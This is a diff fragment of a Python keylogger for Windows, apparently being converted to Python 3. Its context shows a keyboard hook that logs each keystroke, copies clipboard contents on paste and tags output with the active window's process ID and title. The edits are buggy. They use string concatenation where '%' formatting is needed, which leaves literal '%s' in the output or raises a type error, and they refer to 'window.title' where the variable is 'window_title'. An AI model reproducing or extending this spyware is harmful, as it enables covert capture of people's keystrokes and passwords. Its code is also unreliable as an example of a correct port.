@@ -30,9 +30,9 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title),512)
 
     # print out header if we're in the right process
-    print
-    print "[ PID: %s - %s - %s ]" % (process_id,executable.value,window.title.value)
-    print
+    print()
+    print ("[ PID: %s - %s - %s ]" + (process_id,executable.value,window.title.value))
+    print()
 
     # close handles
     kernel32.CloseHandle(hwnd)
@@ -56,10 +56,10 @@ def KeyStroke(event):
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            print "[PASTE] - %s" % (pasted_value),
+            print ("[PASTE] - " + (pasted_value))
 
         else:
-            print "[%s]" % event.Key,
+            print ("[%s]" + event.Key)
 
     # pass execution to next hook registered
     return True
